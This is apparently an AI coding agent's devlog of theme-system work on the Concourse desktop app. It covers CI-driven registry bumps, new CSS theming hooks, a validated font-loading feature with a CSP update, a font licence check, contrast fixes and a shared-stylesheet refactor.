- `release-themes.yml` validated, published (signed), correctly diffed `github.event.before`
  against `github.sha` and dispatched *only* for `sakura-theme` - `midnight-neon-theme` and
  `brick-block-data-theme`, unrelated to this push, were untouched, confirming the diff logic
  actually discriminates rather than dispatching for every theme in the repo every time
- Registry's `bump-entry.sh` matched the dispatch by `id` correctly (not `repo`, which all three
  theme entries share) and opened a PR (`bump/sakura-theme-<short-sha>`) whose diff touched
  *only* `sakura-theme`'s `manifestUrl`/`wasmSha256`, pointing at the exact new commit SHA
- Hit the same one-time bot-PR `action_required` gate seen earlier this session for the very
  first bot-authored PR against this repo - approved via the same `gh api ... /approve` call,
  merged, and the post-merge `validate.yml` run on `main` passed clean
- Full chain - push, diff, dispatch, PR, validate, merge, re-validate - works exactly as
  designed, for a real theme, not a synthetic test

**Post-ship fidelity pass on Brick Block (Data)** - the user actually ran the app and compared
the converted theme against the original, surfacing several real gaps the acceptance test
(which only checked structure/safety, never visual output) never would have.
- **Border shape was round, not sharp.** `.card-visual` had no variable hooks at all -
  `border-radius: var(--radius-md)` and a hardcoded `1px` border, neither overridable. Added
  `--card-radius`/`--card-border-width`, same opt-in pattern as the earlier balloon/button
  hooks, defaulting to prior behavior exactly. `brick-block-data-theme` set `3px`/`0` to match
  the original built-in's values
- **Diagonal stripes + yellow glyph missing.** `.cover-placeholder` had `background`/`color`
  hardcoded to plain `--color-surface0`/`--color-text`, no `text-shadow` or font-size hook at
  all. Added `--cover-placeholder-background` (a CSS custom property can hold a full
  `repeating-linear-gradient(...)` value just as well as a flat color, so no new node type or
  AST change was needed), `-color`, `-text-shadow`, `-font-size`. `brick-block-data-theme` set
  these to the original's exact stripe gradient, `#fce303` yellow, and drop shadow
- **Balloon background/font copy request surfaced a real, separate bug.** Before even getting
  to styling: `DataThemeManifest` (the Rust struct `list_data_themes` parses this file through)
  had never declared a `cardVisual` field at all - it was silently dropped on every
  install/list, regardless of what the manifest actually contained on disk. Caught by directly
  inspecting the *cached* `theme.json` in app-data and finding `cardVisual` simply wasn't there,
  not by assumption. Fixed by adding `card_visual: Option<serde_json::Value>` to the Rust
  struct, and separately confirmed `PluginManifest`/`createDataThemePlugin` on the frontend
  already threaded it through correctly via a plain object spread once Rust actually included
  it - no additional TS-side bug, just the one Rust-side gap
  - Copied the updated manifest directly into `%APPDATA%\com.bloppy.concourse\data-themes\
    brick-block-data-theme\theme.json` to test each fix live without a full publish/registry
    cycle each time - the manifest is what Concourse caches locally, the font file itself never
    gets copied to app-data at all (see below)
- **Balloon background** - `.balloon`'s `background` was hardcoded to `--color-crust`, no hook.
  Added `--balloon-background`. Also fixed the arrow tip
  (`.balloon-above/-below::after`'s `border-*-color`) to track that *same* new variable instead
  of staying separately hardcoded to `--color-crust` - the original built-in `slots` version
  had to manually duplicate its override across both the balloon body and the arrow tip
  (`.brick-balloon` and `.brick-balloon.balloon-above/-below::after`), which meant they *could*
  drift out of sync if someone touched one and not the other; tying both to one variable here
  closes that off structurally rather than just avoiding it by convention
- **Balloon font never actually loaded - and couldn't, structurally, no matter how the
  `cssVariables` value was written.** `--balloon-font-family` only ever lets a theme *select* a
  font by name; it can no more *load* a font file than any other CSS property value can. Real
  loading needs an actual `@font-face` rule with `src: url(...)`, and the data-only tier only
  ever sets flat custom-property values, never raw CSS rules - confirmed this structurally
  before proposing anything, not assumed
  - **New capability: `fontFaces`** (`ThemePlugin.fontFaces`/`PluginManifest.fontFaces`,
    threaded through `createDataThemePlugin` and `DataThemeManifest.font_faces` the same way as
    `cardVisual`). New `src/theme/fontFaceRegistry.ts`: `setActiveFontFaces`/
    `clearActiveFontFaces`, wired into `theme.ts`'s activate/deactivate lifecycle
  - This is declarative data (no code), but still untrusted third-party content going straight
    into a real `<style>` block's text - a family name or url containing `"`/`;`/`{`/`}` could
    otherwise break out of the `@font-face` rule and inject arbitrary CSS elsewhere on the
    page. Every field validated against a strict allowlist before any CSS text is constructed:
    `family`/`weight` against `^[A-Za-z0-9 -]{1,N}$`, `style` against a fixed enum, `url` parsed
    via `new URL()` and required to be `https:`, plus a belt-and-suspenders reject on any
    embedded `"`/`'`/`;`/`{`/`}` even though a well-formed https URL can't contain those per
    spec - untrusted input doesn't get to rely on "shouldn't happen"
  - Verified the validator for real against actual attack strings (CSS-injection via quote+brace
    in the family name, embedded quotes in the url, non-`https:` and `file:` schemes, malformed
    weight/style values) before trusting it, same discipline as the earlier compiler-dom escape
    tests - all correctly rejected, valid entries correctly accepted
  - CSP needed a real change: `font-src` wasn't set at all (falls back to `default-src 'self'`,
    which would've blocked any external font regardless of the validator passing it). Added
    `font-src 'self' https:`, mirroring the precedent `img-src 'self' data: https:` already set
  - Discussed where the referenced font file should actually live before building anything -
    a third-party CDN is meaningfully more vulnerable than self-hosting (unpinnable/mutable
    content, no review trail, the exact thing the built-in theme already moved away from once
    per its own history) versus a commit-pinned `raw.githubusercontent.com` URL into
    `data-theme-plugins` itself (same immutability guarantee already trusted everywhere else
    this session - `cardVisual`, every `wasmSha256` pin). Settled on the latter; `validate.mjs`
    now enforces this as a real check (`fontFaces[].url` must start with
    `https://raw.githubusercontent.com/smh0505/data-theme-plugins/`), not just a convention
  - Clarified for the record: the font *file* lives only in the GitHub repo, never copied to
    local app-data - the WebView itself fetches it live via `@font-face`'s `url(...)` at
    CSS-parse time, the same way any browser loads any remote web font. Concourse's own code
    never touches the font's bytes at all, unlike the manifest JSON which Concourse does
    download and cache locally
- **Re-verified Fusion Pixel Font's actual license against the live upstream repo** before
  redistributing the same file a second time (in `data-theme-plugins`, alongside the copy
  already bundled in Concourse itself), rather than trusting the locally-cached
  `FUSION-PIXEL-OFL.txt` blindly. `gh api` against `TakWolf/fusion-pixel-font` directly:
  - GitHub's repo-level API reports the license as "MIT" - checked further rather than taking
    that at face value, and found the repo actually splits licensing in two: `LICENSE-OFL`
    (the actual font files) and `LICENSE-MIT` (build tooling/scripts only), per the README's own
    explicit "字体"/"构建程序" (Font/Build-tooling) section. GitHub's single `.license` field
    just can't represent a two-license repo and picked one arbitrarily - not authoritative
  - `diff`'d the live `LICENSE-OFL` against the locally-bundled `FUSION-PIXEL-OFL.txt` - byte-
    identical, confirmed nothing drifted
  - Checked the upstream component table too (every source font merged into Fusion Pixel - Ark
    Pixel, Misaki, MisekiBitmap, BoutiqueBitmap7x7/9x9, Cubic-11, Galmuri) - all OFL-1.1 or an
    OFL-compatible unlicensed font, no GPL/proprietary component hiding underneath
  - Conclusion: redistributing the unmodified `.woff2` alongside its OFL license text (already
    the existing pattern) is fully compliant - no conflict between that repo's license and
    `data-theme-plugins`' own, since OFL only binds the font itself, not software bundling it
  - Added `FONTS.md` at the repo root (credits, extensible to future themes) and a `fonts`
    field on the manifest - deliberately separate from the functional `fontFaces` above (pure
    attribution metadata, `{name, author, url, license}`, never consumed by Concourse at all,
    not threaded through any Rust/TS type). `validate.mjs` gained a light shape check for both
    new fields - verified it actually fires (not vacuously passing) against a deliberately bad
    CDN URL and an incomplete `fonts` entry, since nothing in the existing manifests exercised
    either branch before that test
  - `README.md` also gained documentation for `cardVisual`/`fontFaces`/`fonts`, none of which
    had been documented there since they were first added earlier this session - a real gap,
    not just this pass's own additions
- All of the above committed and pushed once the user lifted the earlier "hold" instruction.
  Confirmed the font URL actually resolves (`curl`, matched the real 668640-byte file) before
  wiring `fontFaces` to it - a separate follow-up commit, since the URL needed that commit's
  own SHA first. `validate.mjs`'s new `fontFaces`/`fonts` checks ran for real in CI this time,
  not just locally. Both pushes to `data-theme-plugins` correctly dispatched their own registry
  PR each (the diff-based dispatch logic distinguishing them correctly); the first (pointing at
  the pre-`fontFaces` commit) was closed as stale once the second, complete one opened - same
  "two open bump PRs for one id, close the older" guidance from earlier in this session, now
  actually exercised for real rather than just documented as a rule

**Post-close follow-up: themes can now re-skin the whole UI's font, not just individual
elements.** User asked directly for this - "the font affects the whole ui from now on." Traced
the actual gap first rather than assuming new plumbing was needed: `stores/theme.ts`'s
`applyCssVariables` already applies *any* CSS custom property a theme's `cssVariables` map
declares straight onto `documentElement.style` via `setProperty` (no key allowlist - themes have
always been able to set an arbitrary variable name), and virtually every component already reads
`font-family: inherit` rather than hardcoding a typeface (verified via a repo-wide grep - the
only two literal `font-family` values left are intentional `monospace` overrides for code/ID
text in `GameDetail.vue`/`ConfirmInstall.vue`, plus two pre-existing opt-in per-element hooks -
`--balloon-font-family` on `GameCard.vue`, `--tile-title-font-family` on `BigPictureTile.vue` -
both already defaulting to `inherit`). The actual gap was one line: `styles.css`'s `:root` block
set `font-family: Inter, Avenir, Helvetica, Arial, sans-serif` as a literal value, never reading
from a variable, so no theme's `cssVariables` override could ever reach it regardless of how
permissive the underlying mechanism already was.

Fixed by promoting that literal into a proper `--font-family` design token (default value
unchanged) and pointing the `:root` rule's own `font-family` at `var(--font-family)`. Since
inheritance already does the rest of the work app-wide, this one token is now the single hook a
theme needs - paired with the existing `fontFaces` mechanism (`theme/fontFaceRegistry.ts`,
already built and already used for real by `data-theme-plugins`' Fusion Pixel bitmap font, so
far only wired into that theme's `cardVisual` glyph, not the whole UI) to load a real
`@font-face` first if the chosen family isn't a system font already present. No plugin
manifest/type changes needed anywhere - `ThemePlugin.cssVariables` was already `Record<string,
string>`, unconstrained. `bun run build` clean.

**Post-close follow-up: "Built-in" label replaces the fake version number on build-time TS
plugins.** User noticed built-in themes stay at `1.0.0` forever (verified: the catppuccin-*
plugins' `plugin.json` files were never bumped despite real `cssVariables` edits across this
session and prior ones - `CLAUDE.md`'s per-plugin SemVer convention was never actually being
followed for these) and asked why not just label them differently instead of showing a version
number that structurally can never change. `PluginManifest.runtime` (absent or `"ts"` = build-
time, bundled with the app itself) is the exact signal already available to tell these apart
from installed WASM/data plugins, which *do* get real version bumps and update-checks. Added one
`versionLabel(manifest)` helper in `PluginSettings.vue` (checked once, used at all 5 tab-render
sites that used to inline `v{{ manifest.version }}`), returning a new `pluginSettings.builtIn`
i18n key ("Built-in") for the build-time case, the real `v{version}` otherwise. Translated the
new key into all 9 other locales and re-verified key-parity (same flatten-and-diff check as the
original locale rollout) before building. `bun run build` clean.

**Post-close follow-up: fixed dark-on-dark text in GameList rows on dark themes.** User reported
Catppuccin Frappe/Macchiato/Mocha and Midnight Neon making list-row text hard to read. Traced to
`GameListRow.vue`'s `.info` rule: `color: var(--color-on-accent)`, where `--color-on-accent`
defaults to `var(--color-base)` (the theme's own background color - dark for a dark theme).
That sat over `.scrim`, a hardcoded `rgba(0,0,0,0.8→0.25)` black gradient regardless of theme -
so dark themes got dark text directly over a black background. The variable was simply the
wrong one for the job: `--color-on-accent`'s actual contract (per its own doc comment in
`styles.css`) is "text/icon color for anything on top of `--color-accent`," not "text over this
specific hardcoded-black scrim." Since the scrim's own color is fixed (not theme-derived) the
correct fix is a fixed text color to match, not a different theme token - swapped to a literal
`#fff` (matching the existing `text-shadow: rgba(0,0,0,0.6)` on `.title`, which only ever made
sense assuming light text in the first place, suggesting this was the original intent that
`--color-on-accent` accidentally broke).

Found the identical defect in two more spots while fixing this one: `GameListRow.vue`'s own
`.fetch-overlay` (same hardcoded black background, same wrong variable) and `GameCard.vue`'s
`.fetch-overlay` (byte-identical pattern, copy-pasted between the two components) - fixed both
the same way rather than leaving a known-identical bug sitting right next to the one just fixed.
`bun run build` clean.

**Follow-up, on user request: `.info`'s fix redone as a proper token instead of a hardcoded
literal, plus the same bug found in `StatsPanel.vue`.** User was fine with `.fetch-overlay`'s
hardcoded `#fff` but wanted `.info` to go through a design token instead - consistent with
Milestone 17's own shared-styles-convention push against magic values living in component CSS.
Added `--color-scrim-text` to `styles.css`'s `:root` token block (default `#ffffff`, next to
`--color-on-accent` with a comment explaining why it's a separate token rather than reusing that
one: `--color-on-accent` tracks `--color-base`, which is exactly the wrong thing to track for
content sitting over a scrim whose color is fixed independent of the theme). `GameListRow.vue`'s
`.info` now reads `var(--color-scrim-text)` instead of the hardcoded `#fff` from the previous
fix. Also checked for the same pattern elsewhere per the user's tip ("same bug ... in the stats
page") - found `StatsPanel.vue`'s `.stat-row-title`/`.stat-row-subtitle`, an identical
`--color-on-accent`-over-hardcoded-black-`.scrim` case in the Most Played/Recently Played rows,
fixed the same way. `.fetch-overlay` in both `GameListRow.vue`/`GameCard.vue` deliberately left
as the hardcoded `#fff` from the prior fix, per direct instruction. `bun run build` clean.

**Second follow-up: user proposed a genuinely different approach - tint the scrim's own
background toward the theme instead of fixing the text color.** Rather than a fixed
`--color-scrim-text`, tint `.scrim` toward `--color-base` via `color-mix(in srgb, var(--color-
base) 80%/25%, transparent)`, then let `.info`/`.stat-row-title`/`.stat-row-subtitle` go back to
plain `--color-text` - since that pairing is already guaranteed-contrast by every theme's own
design, no new fixed-color token needed at all. Flagged the tradeoff before implementing: this
changes the actual visual look (light themes get a paler wash instead of the existing black
vignette), not just the contrast bug, and needs `color-mix()` (CSS custom properties can't do
alpha-blending arithmetic directly) - confirmed fine on Tauri's WebView2/Chromium target. Tried
it at the user's request, left uncommitted so it could be reverted freely.

User's own verdict: "looks not bad but not good either" - asked whether any token was "stronger"
than `--color-base` for more punch. Checked the existing base/mantle/crust trio every theme
defines: `--color-crust` is consistently the darkest/most-saturated of the three (Mocha
`#1e1e2e`→`#11111b`, Midnight Neon `#0d1117`→`#010409`, Brick Block `#5c94fc`→`#0058f8`) -
already used once elsewhere (`GameCard.vue`'s hover balloon, `var(--balloon-background,
var(--color-crust))`, paired successfully with plain `--color-text` there). Swapped the
`color-mix()` target to `--color-crust` and tried it.

Before committing, computed the actual WCAG contrast for the one theme most likely to break:
Brick Block, whose crust (`#0058f8`) equals its own accent color. Relative-luminance contrast
between `#0058f8` and Brick Block's `--color-text` (`#1a1a2e`) came out to **~3.08:1** - fails
the 4.5:1 AA threshold for normal-size text (these rows' titles are ~0.85-0.9rem, not "large
text" by the 3:1 large-text exemption). This lines up with a signal already sitting in Brick
Block's own manifest: it defines a separate `--color-button-text: #ffffff` specifically because
its own `--color-text` doesn't hold up against its saturated accent/crust blue - the same failure
mode, already worked around once for buttons, about to recur here.

**Solution: a new `--color-tint` token, defaulting to `--color-crust`, letting Brick Block
override just this one value instead of every theme losing crust's punch.** Asked the user to
confirm the exact override value before touching a separate repo's manifest (genuine ambiguity -
"same as its button color" could have meant several different existing tokens) - confirmed via
`AskUserQuestion` as `--color-mantle`, the same value/reasoning Brick Block's own
`--balloon-background` override already uses for the identical underlying problem. Added
`--color-tint: var(--color-crust)` to `styles.css`'s `:root` (removing the now-unused
`--color-scrim-text` token entirely rather than leaving dead code behind), pointed both
`.scrim`'s `color-mix()` calls at it, and updated `data-theme-plugins`' `brick-block-data-theme`
manifest to `"--color-tint": "var(--color-mantle)"` (bumped 1.5.0 → 1.6.0, `bun run validate`
clean). Copied the edited manifest straight into `%APPDATA%\com.bloppy.concourse\data-
themes\brick-block-data-theme\theme.json` (the cache path `plugin_installer.rs`'s
`install_data_theme` writes to - found via `data_themes_dir()`/`list_data_themes_from()`) to
test live without a real publish/install round-trip. User confirmed it looked right.

**Extended to Tags/Collections rows on request, but the request needed scoping first.**
`TagsPanel.vue`/`CollectionsPanel.vue`'s `.item-row.list-row-shell` rows have no cover art, no
`.scrim`, and no `--color-on-accent` usage at all - nothing broken there to port a fix to, so
asked via `AskUserQuestion` what "apply this change" actually meant before guessing; confirmed
as "give the rows a `--color-tint` background" for visual consistency, not a bug fix. Took two
more rounds to land on the right implementation, both directly corrected by the user rather than
guessed correctly the first time:
- First attempt: a flat `color-mix(in srgb, var(--color-tint) 15%, transparent)` background on
  `.item-row` - invisible in practice (`--color-tint`/`--color-base` are very close in hue/
  lightness for several themes, especially Catppuccin Latte, at only 15% mix), user reported "I
  don't see any change." Bumped to 35% and wrapped it in a (same-color, both-stops) `linear-
  gradient()` on a hunch it might be a raw-`color-mix()`-as-`background`-value rendering quirk -
  still "still bad."
- User found the actual root cause: `.item-row`'s background needs to be the same construction
  `.stat-row`'s `.scrim` already uses, not a fresh flat value - copied `.scrim`'s exact gradient
  (`75%`/`25%` stops, not 35% flat) directly onto `.item-row` as its own background (no cover art
  here to layer a separate child scrim over, so it becomes the row's own background outright).
  This time it worked ("much better").
- Final touch, still user-directed: `.item-row`'s background layered again, this time over
  `var(--cover-placeholder-background, var(--color-surface0))` (the same fallback token
  `GameCard.vue`'s no-cover placeholder already uses) as a second background layer, so a theme's
  dedicated placeholder pattern (Brick Block's brick/stripe `repeating-linear-gradient`) shows
  through Tags/Collections rows too, not just cover-art rows.

**Final touch before committing: card-frame tokens instead of button-frame tokens on every row
touched this session.** `.list-row-shell` (styles.css, shared by GameListRow/SkeletonRow/the new
`.item-row` rows) and `StatsPanel.vue`'s `.stat-row` both had `border: var(--button-border-
width) solid var(--color-surface1); border-radius: var(--radius-lg)` - the button frame, not the
card frame `GameCard.vue`'s `.card-visual` already exposes as opt-in hooks (`--card-border-width`/
`--card-radius`). Since these are literally cards rendered as rows, switched both to `var(--card-
border-width, 1px)`/`var(--card-radius, var(--radius-lg))` instead, so Brick Block's chunkier
3px/square-corner card look now applies uniformly across GameCard, GameListRow, StatsPanel, and
Tags/Collections rows, not just the grid card.

Bumped `1.4.1` → `1.4.2` (patch, UI-polish fixes within the still-open Milestone 14, not a new
Post-1.0 milestone closing) across `package.json`/`src-tauri/Cargo.toml`/`src-tauri/
tauri.conf.json`; `cargo check` clean, `bun run build` clean. Tagged/pushed `v1.4.2` per the
established convention. `data-theme-plugins`' Brick Block bump (1.6.0) committed/pushed
separately in its own repo, no tag (plugin versioning is independent SemVer, not app-milestone-
tracked - see `CLAUDE.md`).

## Milestone 17 — Shared Styles Convention (scoped, not started)
User proposed a style-convention change directly: less `<style scoped>` per component, more
shared CSS (colors, borders, radii, other repeated patterns) collected into a `styles.css`.
Asked whether this was "huge enough" to warrant its own milestone rather than just doing it -
judged yes, for two concrete reasons rather than a reflexive "big changes get milestones" rule:
- Real scope. This session's Brick Block work touched `GameCard.vue`'s scoped styles five
  separate times (`.card-visual`, `.cover-placeholder`, `.balloon` and its arrow tip), each time
  because a value was hardcoded in one component's own scoped block with no way for a theme (or
  any other consumer) to reach it. That's a real, repeated pattern across a real component, not
  a one-off - auditing every other component (`BigPictureTile.vue`, the modal forms, etc.) for
  the same shape is genuine, non-trivial work
- A real, already-proven failure mode to design around, not a hypothetical. `.cover`/
  `.cover-placeholder` had to move out of `<style scoped>` entirely earlier this session because
  `CardVisualRenderer` (a separate component) needed to render them and Vue's scoped-CSS
  mechanism (a compiled `data-v-<hash>` attribute, unique per component) meant a scoped rule
  there would have silently never matched. Any "collect shared styles centrally" effort needs
  to reckon with this same boundary deliberately, not rediscover it component-by-component the
  way this session did
- Scoped rather than started: three checklist items logged (audit real duplication before
  moving anything, decide `styles.css`'s relationship to `App.vue`'s existing `:root` token
  block, migrate with the same compiled-output verification discipline used for every CSS fix
  this session, not a visual-assumption pass) - deliberately not designed further than that
  without actually doing the audit first

**Audit done (delegated to Explore, 22 components read).** Real findings, organized the same
way the milestone scoped it:
- **Exact duplicate blocks worth centralizing**: the skeleton shimmer animation + `@keyframes`
  (`SkeletonCard.vue`/`SkeletonRow.vue`, byte-identical); list-row shell + thumbnail dimensions
  (`GameListRow.vue`/`SkeletonRow.vue`); tag pill styling (`GameFilters.vue`/`EditGame.vue`);
  empty-state layout (`GameGrid.vue`/`GameList.vue`); and the biggest cluster - most of Big
  Picture's dark-backdrop scheme (colors, z-index layering, fade transitions, placeholder
  color, several `var(..., literal-fallback)` pairs) duplicated near-identically across
  `BigPictureGrid.vue`/`BigPictureSlideshow.vue`/`BigPictureTile.vue`. Also flagged: two of
  those duplicated fallback literals (`var(--shadow-lg, 0 12px 32px rgba(0,0,0,0.5))` and
  `var(--radius-lg, 12px)`) don't even match the real tokens' actual values (`0.18` alpha,
  `10px`) - if the variable were ever genuinely undefined, the fallback would render visibly
  different from the token's real default, a latent inconsistency independent of the
  duplication itself
- **Existing tokens not used**: hardcoded `1px` borders (10+ files) where
  `--button-border-width` already exists for exactly this; hardcoded `0.5rem`/`0.75rem` gaps
  (10+ files) matching `--space-2`/`--space-3` exactly; `border-radius: 4px`
  (`NavSidebar.vue`, the list-row thumbnail) matching `--radius-sm`; `padding: 1.5rem`
  (`BaseModal.vue`) matching `--space-5`; `color: white` (`TitleBar.vue`) where the established
  convention elsewhere is `--color-on-accent`
- **Two off-token values needing a real decision, not a mechanical move**: `border-radius: 8px`
  (list-row shell) and `3px` (tag pills) don't match any of `--radius-sm/md/lg` (4/6/10px) -
  standardize onto an existing token, or these are genuinely a fourth radius value the scale
  doesn't have yet. Left open rather than picked arbitrarily
- **Category 3 (the scoped-CSS/foreign-component risk this milestone exists partly to design
  around)**: no second live instance of the exact `GameCard.vue`/`CardVisualRenderer` bug found.
  One correct usage of the same underlying pattern found instead - `PluginSettings.vue` reaches
  into `InstallableStatus.vue`'s root class via Vue's `:deep()` combinator, which is
  specifically designed to pierce the scoped-CSS boundary deliberately, unlike the `.cover`/
  `.cover-placeholder` bug which just happened to work by accident until it didn't. Worth
  documenting `:deep()` as the sanctioned escape hatch once `styles.css`'s conventions get
  written up. One forward-looking risk noted, not urgent: `BigPictureTile.vue` is currently
  swapped wholesale via `useThemeSlot` (a full component swap, safe), but if a "tile visual
  AST" mechanism is ever added mirroring Milestone 16's card visual, `.tile-cover`/
  `.tile-cover-placeholder` would need the same unscoped treatment pre-emptively, not
  discovered the hard way again
- Also flagged (not one of the three assigned categories, but real): `.settings-form` is a de
  facto contract class name - any plugin kind's `settingsComponent` is expected to emit it
  (`PluginSettings.vue` reads it via `:deep()` for every plugin kind) - a shared-contract class
  that should probably be documented alongside whatever `styles.css` convention gets written,
  since it's exactly the kind of implicit cross-component convention this milestone is trying
  to make explicit

**`:root` moved into `src/styles.css` - decided immediately after the audit, not left open.**
User's call: absorb entirely, not split token-vs-pattern across two files. Moved the whole
`:root {}` rule verbatim (including the `font-family`/`color`/`background-color` lines that
live inside the same rule, not just the custom properties) into a new `src/styles.css`,
imported once via `main.ts` (`import "./styles.css"`) rather than through `App.vue`, so the
global stylesheet isn't tied to that component's own file. `App.vue` now has a one-line comment
pointing at the new location instead of the block itself.
- Verified for real rather than assumed: rebuilt, then `grep`'d the actual compiled CSS output
  for the `:root` rule and confirmed every single token survived with byte-identical values
  (colors, spacing, radii, shadows, `--button-border-width`) - not just "the build didn't
  error," an actual diff-equivalent check against the pre-move values
- `cargo check` unaffected (no Rust touched) - checked anyway rather than assumed safe
- Migrating the actual Category 1 duplicate patterns into `styles.css`, and resolving the two
  off-token radius values, remain open - this pass was the audit + the one concrete decision
  (`:root`'s new home), not the full migration

**Resolved the two off-token radius values.** `3px` (tag pills, `GameFilters.vue`/`EditGame.vue`)
snapped onto `--radius-sm` (4px) directly - a 1px nudge, no real decision needed. `8px` (list-row
shell) was genuinely ambiguous - exactly equidistant between `--radius-md` (6px) and
`--radius-lg` (10px), no code-derivable answer - so asked rather than picking arbitrarily.
User chose a new dedicated token over snapping onto either existing step or renaming/expanding
the sm/md/lg scale itself (which would've meant repointing `--radius-lg`'s existing consumers,
well beyond what these two components needed).
- Added `--radius-row: 8px` to `styles.css` initially, wired `GameListRow.vue`/`SkeletonRow.vue`
- **Caught a third, previously-unaudited occurrence of the same `8px` value while migrating**:
  `BaseModal.vue`'s `.modal-frame` - the earlier Explore-delegated audit's Category 1 finding
  only named the two list-row files, missing this one. Found by grepping the compiled CSS
  output for any remaining literal `8px`/`3px` radius after the "fix," rather than trusting the
  audit's file list as complete - a real gap in the earlier audit, not just extra diligence
  that happened to turn up nothing
  - This meant `--radius-row` was the wrong name after all - a modal frame isn't a "row."
    Renamed to `--radius-panel` (covers both a list-row shell and a modal frame as generic
    container semantics) before it could spread under a name that didn't fit, updated both
    already-migrated consumers plus the new `BaseModal.vue` site
- Verified via compiled CSS, not assumed: `--radius-panel: 8px` present in the token block,
  zero remaining literal `border-radius:8px`/`3px` anywhere in `src/` (a fresh `grep -rn`
  across the whole source tree, not limited to the audit's original file list, to make sure
  nothing else was missed a second time)

**`--radius-panel` folded into the named scale, on further user direction.** Rather than keep
`8px` as a one-off outside the `sm`/`md`/`lg` naming pattern, shifted the whole scale: old
`--radius-lg` (10px) became `--radius-xl`, `--radius-panel` (8px) took over the `--radius-lg`
name - `sm`/`md`/`lg` (4/6/10) becomes `sm`/`md`/`lg`/`xl` (4/6/8/10). This is exactly the
higher-blast-radius option flagged (and set aside) during the original 8px decision - "would
mean renaming --radius-lg and repointing its existing consumers, well beyond what these
components actually need" - now deliberately chosen instead once the token had a real second
use (`BaseModal.vue`) beyond the original two files.
- `grep`'d every real consumer before touching anything, not just the ones already in this
  session's working set: `BigPictureTile.vue`/`BigPictureSlideshow.vue` both had a live
  `var(--radius-lg, 12px)` needing the rename too
- **Fixed a real pre-existing bug while touching those two lines, not just renaming past it**:
  the fallback literal `12px` never matched `--radius-lg`'s actual value (10px) - flagged in
  the original Explore audit as a latent inconsistency ("if the variable were ever genuinely
  undefined, the fallback would render visibly different from the token's real default") but
  not fixed at the time since it wasn't in scope then. Now `var(--radius-xl, 10px)`, correctly
  in sync
- Verified via compiled CSS: all four scale values (`sm`/`md`/`lg`/`xl` = 4/6/8/10px) present
  with correct values, zero stray `--radius-panel` or `12px` fallback left in either source or
  build output
- Left the historical devlog/milestones entries documenting `--radius-panel`'s original
  creation as-is rather than rewritten - they're a record of what was true at the time, not a
  live description of the current state; this entry is the update, not an edit to those

**Moved App.vue's remaining unscoped `<style>` block into `styles.css` too.** Clean split once
looked at directly: App.vue's `<style scoped>` block (`.app-window`, `.app-shell`, `.content`,
`.big-picture-controls`, `.view-toggle-button`) is genuinely App.vue's own template - stayed.
Its separate unscoped `<style>` block (`*`/`*::before`/`*::after` box-sizing, `html`/`body`/
`#app` reset, the `button`/`input`/`textarea`/`select` baseline and focus/disabled states, the
themed-scrollbar rules) is universal primitive-element styling with nothing App.vue-specific
about it at all - moved wholesale, same reasoning as the `:root` move earlier.
- Verified via compiled output, not assumed identical just because it's "just a move": checked
  for accidental duplication (`grep -c` on the `button{...}` base rule, the scrollbar rule, and
  `:root` - each appears exactly once, not twice), and confirmed the `.app-window` scoped rule
  still carries its `data-v-*` attribute correctly (proof the remaining scoped block still
  compiles as scoped, not accidentally flattened by the edit)
- Noted, not fixed (out of scope for a pure relocation): the global input/textarea/select rule
  still hardcodes `1px` instead of `var(--button-border-width)` - one of the pervasive
  `1px`-instead-of-token sites the original audit already flagged. Left for the actual
  Category-1-pattern migration pass, not bundled into this move
- `App.vue` now has zero non-scoped CSS of its own - every primitive/global rule lives in
  `styles.css`, every remaining rule in `App.vue` is genuinely scoped to its own template

**Migrated 4 of the audit's Category 1 duplicate blocks into shared `styles.css` classes.**
Pattern for each: identify the genuinely-shared subset of properties, add it as a shared class,
keep only each component's real extra properties in its own `<style scoped>` block, and layer
both classes on the same template element (`class="local-name shared-name"`) rather than
picking one or the other - preserves each component's own semantic class name (useful in
devtools/for future component-specific overrides) while eliminating the actual duplication.
- `.shimmer` + `@keyframes shimmer` - `SkeletonCard.vue`/`SkeletonRow.vue`'s shimmer divs now
  reference the shared class directly (`class="shimmer"`, replacing `skeleton-shimmer`); both
  local `@keyframes shimmer` blocks and the duplicated gradient rule deleted entirely - neither
  component had anything extra layered on top, so nothing stayed local for this one
- `.list-row-shell` (shell layout/border/padding) and `.list-row-thumb` (dimensions/radius) -
  `GameListRow.vue`'s `.row`/`.thumb`/`.thumb-placeholder` and `SkeletonRow.vue`'s
  `.skeleton-row`/`.skeleton-thumb` templates gained the shared classes alongside their own
  names; `GameListRow.vue`'s `.thumb` keeps only `object-fit: cover` locally (the original
  combined `.thumb, .thumb-placeholder` selector applied `object-fit` to the placeholder `<div>`
  too, which is a no-op there per spec - object-fit only affects replaced elements - so scoping
  it to just `.thumb` changes nothing observable, just removes a meaningless line from the
  placeholder's rule)
- `.tag-pill` - `GameFilters.vue`'s `.tag` rule had nothing extra beyond the shared subset,
  deleted entirely once `tag-pill` was added to its template class list. `EditGame.vue`'s
  `.tag` kept its real extra properties (the remove-button's `inline-flex`/`gap` layout)
- `.empty-state` - `GameList.vue`'s `.empty` was byte-for-byte the shared subset, deleted
  entirely; `GameGrid.vue`'s kept just its one real extra property, `grid-column: 1 / -1`
- **Verified via compiled CSS, not assumed correct just because the source diff looked clean**:
  confirmed each of the 4 shared classes compiles exactly once with the expected properties;
  confirmed `.row`/`.skeleton-row` (fully-emptied local rules) emit *zero* CSS output now, not
  an empty-but-present rule; confirmed `.tag[data-v-*]` (EditGame's) only carries the 3 leftover
  properties, not the full original set; confirmed the 4 distinct `.empty[data-v-*]` rules
  still in the bundle are legitimately separate, untouched components
  (`BigPictureGrid.vue`/`BigPictureSlideshow.vue`/`PluginSettings.vue`, plus `GameGrid.vue`'s
  intentional one-property leftover) - not a sign anything was missed
- CSS bundle shrank 22.65kB → 21.85kB, consistent with real duplication actually removed, not
  just reorganized
- Left explicitly out of scope: Big Picture's own, much larger backdrop-styling duplication
  cluster (a separate audit finding, its own migration effort), and the remaining Category 2
  unused-token findings (`--space-2`/`--space-3` gaps, `--space-5` padding, `--color-on-accent`)

**Migrated Big Picture's backdrop cluster - the audit's biggest single finding, spanning
`BigPictureGrid.vue`/`BigPictureSlideshow.vue`/`BigPictureTile.vue`.** Read all three files
fully before designing anything, rather than working from the audit summary alone - found the
actual duplication was more granular than "the backdrop scheme," really seven separate
sub-patterns of varying overlap:
- `.bp-surface` - the root full-screen dark base (`position:fixed;inset:0;background:#111;
  color:#fff;z-index:20;outline:none`), identical between `.big-picture`/`.slideshow`; each
  keeps its own scroll/overflow handling locally
- `.bp-backdrop` - the background-art image positioning, 100% identical, no local remainder
  needed in either file
